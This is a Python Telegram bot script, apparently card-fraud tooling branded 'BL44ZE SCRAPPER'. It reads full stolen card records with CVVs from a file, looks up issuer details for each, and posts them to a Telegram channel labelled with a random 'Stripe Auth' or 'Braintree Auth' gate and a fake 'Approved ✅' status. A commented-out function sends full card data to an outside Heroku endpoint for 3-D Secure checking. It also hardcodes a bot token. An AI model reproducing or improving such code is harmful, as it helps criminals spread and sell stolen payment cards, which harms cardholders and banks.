import telebot
import threading
import time
import requests
import json
import random

TOKEN = "7463674674:AAH6RbKYA_CnR8ysR9QZti2QdEdZbu66MRA"
bot = telebot.TeleBot(TOKEN)
CHANNEL_NAME = -1002175110659

def get_bin_info(bin_number):
    api_url = "https://bins.antipublic.cc/bins/{}".format(bin_number)
    try:
        response = requests.get(api_url)
        if response.status_code == 200:
            bin_data = response.json()
            return bin_data
        else:
            print(f"Error: Received status code {response.status_code} from BIN API")
            return None
    except Exception as e:
        print("Error fetching bin info:", e)
        return None

# def check_vbv(full_cc):
#     cc_number, exp_month, exp_year, cvv = full_cc.split('|')
#     api_url = f"https://vbvmo-44e07c4442f2.herokuapp.com/{cc_number}|{exp_month}|{exp_year}|{cvv}"
#     try:
#         response = requests.get(api_url)
#         print(f"VBV API request URL: {api_url}")  # Debug output
#         if response.status_code == 200:
#             vbv_data = response.json()
#             print(f"VBV API response: {vbv_data}")  # Debug output
#             if isinstance(vbv_data, dict):
#                 if vbv_data.get("result") == "Challenge Required":
#                     return "Authentication Failed 3D Card ❌"
#                 elif vbv_data.get("result") == "Authenticate Successful":
#                     return "Authentication Successful ✅"
#                 elif vbv_data.get("result") == "Authenticate Attempt Successful":
#                     return "Authentication Successful ✅"  
#                 elif vbv_data.get("result") == "Authenticate Frictionless Failed":
#                     return "Authenticate Frictionless Failed ❌"
#                 elif vbv_data.get("result") == "Authenticate Rejected":
#                     return "Authenticate Rejected ❌"
#                 elif vbv_data.get("result") == "Lookup Error":
#                     return "Authenticate Rejected ❌"
#                 elif vbv_data.get("result") == "Lookup Card Error":
#                     return "Authenticate Rejected ❌"
#                 elif vbv_data.get("result") == "Authentication Unavailable":
#                     return "Authentication Unavailable ❌"
#                 else:
#                     return "Unknown Error"
#             else:
#                 print("VBV response is not a valid JSON object:", vbv_data)
#                 return "Unknown"
#         else:
#             print(f"Error: Received status code {response.status_code} from VBV API")
#             return "Unknown"
#     except json.JSONDecodeError as e:
#         print("Error decoding JSON response from VBV API:", e)
#         return "Unknown"
#     except Exception as e:
#         print("Error checking VBV status:", e)
#         return "Unknown"

def format_bin_info(bin_data, full_cc):
    cc = bin_data.get("bin", "")
    brand = bin_data.get("brand", "Unknown")
    card_type = bin_data.get("type", "Unknown")
    level = bin_data.get("level", "Unknown")
    bank = bin_data.get("bank", "Unknown")
    country_name = bin_data.get("country_name", "Unknown")
    country_flag = bin_data.get("country_flag", "")

    auth_methods = ["Stripe Auth", "Braintree Auth"]
    random_auth = random.choice(auth_methods)

    formatted_info = f"""<b> 
➜ BL44ZE SCRAPPER 

𝙲𝙲 ➔ <code>{full_cc}</code>
GATE ➔ {random_auth}
RESPONSE ➔ Approved ✅
 
𝙱𝙸𝙽 ➔ {cc[:6]}
𝙸𝙽𝙵𝙾 ➔ {brand} - {card_type} - {level}
𝙱𝙰𝙽𝙺 ➔ {bank}
𝙲𝙾𝚄𝙽𝚃𝚁𝚈 ➔ {country_name} - {country_flag}

➜ 𝗜𝗡𝗙𝗢 
  MY CHANNEL ➔ @EliteSentinals
  DEV ➔ @Gryph0_n  
</b>"""
    return formatted_info

def send_file_lines_to_channel(cc_file):
    with open(cc_file, "r") as file:
        for line in file:
            full_cc = line.strip()
            bin_info = get_bin_info(full_cc[:6])
            if bin_info:
                # vbv_status = check_vbv(full_cc)
                formatted_info = format_bin_info(bin_info, full_cc)
                bot.send_message(CHANNEL_NAME, formatted_info, parse_mode="html")
                time.sleep(10)
                print(f"Processed: {full_cc}")
            else:
                print(f"Error fetching bin info for {full_cc}")

send_file_lines_to_channel("ccs.txt")

def recibir_msg():
    bot.infinity_polling()

recibir_msg()
